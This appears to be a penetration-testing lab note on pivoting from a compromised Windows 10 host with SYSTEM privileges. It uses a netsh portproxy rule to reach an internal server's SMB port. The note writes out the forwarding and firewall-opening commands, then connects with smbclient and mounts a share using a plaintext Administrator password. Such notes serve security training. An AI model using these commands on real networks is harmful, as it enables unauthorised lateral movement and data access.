### Scenario:
Compromised Win10 host with SYSTEM privs. Disvoer additional internal subnet on different interface. Identify Win Server 2016 with TCP 445 open.

Looking for ways to pivot inside victim network from SYSTEM-level shell on Win10. Due to priv level, we don't have to worry about UAC, so we can use **netsh** installed by default on all modern versions of windows for port forwarding and pivoting. 

For this to work, system must have **IP helper** service running and **IPv6** support must be enabled for the interface we want to use. *Both are enabled by default.* 

Be sure to check that **IP helper** is running from **Windows Services** program. 

Confirm **IPv6** support via network interface settings. 

### Execution
Similar to SSH local port forwarding, we will redirect traffic destined for compromised Win10 machine on TCP 4455 to Win Serve 2016 on TCP 445:
`netsh interface portproxy add v4tov4 listenport=4455
listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110`
**interface** context to **add** an IPv4 to IPv4 (**v4tov4**) proxy (**portproxy**) listening on 10.11.0.22 (**listenaddress=10.11.0.22**) port 4455 (**listenport=4455**) that will forward to win serv 2016 (**connectaddress=192.168.1.110**) on port 445(**connectport=445**).

### Testing and Connection
Confirm port 445 listening on Win10:
`netstat -anp TCP | find "4455"`

By default, Windows Firewall will disallow inbound TCP 4455. Given that we are SYSTEM, we can add a firewall rule to allow inbound connections on that port:
`netsh advfirewall firewall add rule name="forward_port_rule"
protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow`


Connect via **smbclient** (making sure to configure SMBv2):
`sudo nano /etc/samba/smb.conf'`
`cat /etc/samba/smb.conf`
`sudo /etc/init.d/smbd restart`
`smbclient -L 10.11.0.22 --port=4455 --user=Administrator`

Successfully listed shares but got a timeout error, generally due to port forwarding. We can usually still interact with the shares, proving port forwarding is successful:
`sudo mkdir /mnt/win10_share`

`sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o
username=Administrator,password=Qwerty09! /mnt/win10_share`

`ls -l /mnt/win10_share/`

`cat /mnt/win10_share/data.txt`








